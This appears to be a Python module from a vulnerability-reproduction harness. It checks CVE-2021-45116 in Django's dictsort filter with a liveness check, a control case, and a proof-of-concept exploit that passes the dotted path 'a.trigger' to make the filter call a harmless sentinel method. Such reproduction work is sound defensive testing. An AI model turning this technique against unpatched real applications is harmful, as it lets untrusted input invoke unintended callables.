"""CVE-2021-45116 -- Django's dictsort resolves through template Variable.

3.2.10 -> 3.2.11. ``dictsort``'s argument was resolved with
``Variable(arg).resolve``, which walks dotted paths and, crucially, *calls*
anything callable it lands on. A template whose sort key came from untrusted
input could therefore reach and invoke attributes the template author never
intended to expose.

Oracle, declared before execution: a sentinel method that the filter argument
never marks as a call is nonetheless invoked, and the sentinel object records
that itself. A side effect in the target, observed by the target.
"""

from __future__ import annotations

import os

from ._support import pinned_version

DIST = "django"
MODULE = "django"


class _Sentinel:
    """Records whether the template machinery called it."""

    def __init__(self) -> None:
        self.called = False

    def trigger(self) -> int:
        self.called = True
        return 1


def _setup() -> None:
    import django
    from django.conf import settings

    if not settings.configured:
        settings.configure(USE_I18N=False, USE_TZ=False)
        django.setup()


def liveness(ctx: dict) -> tuple[bool, str]:
    """dictsort must sort an ordinary list of dicts, and the pin must be the pin."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    _setup()
    from django.template.defaultfilters import dictsort

    rows = [{"n": 2}, {"n": 1}]
    out = dictsort(rows, "n")
    ok = isinstance(out, list) and [r["n"] for r in out] == [1, 2]
    return ok, f"benign dictsort -> {out} from {os.path.basename(origin)}"


def control(ctx: dict) -> tuple[bool, str]:
    """The same oracle with a plain key, not an attribute path. Must NOT fire."""
    _setup()
    from django.template.defaultfilters import dictsort

    sentinel = _Sentinel()
    dictsort([{"a": sentinel, "n": 1}], "n")
    return sentinel.called, f"plain-key sort, sentinel.called={sentinel.called}"


def exploit(ctx: dict) -> tuple[bool, str]:
    _setup()
    from django.template.defaultfilters import dictsort

    sentinel = _Sentinel()
    result = dictsort([{"a": sentinel}], "a.trigger")
    return sentinel.called, (
        f"dictsort(..., 'a.trigger') invoked the sentinel={sentinel.called}; "
        f"result type={type(result).__name__}"
    )
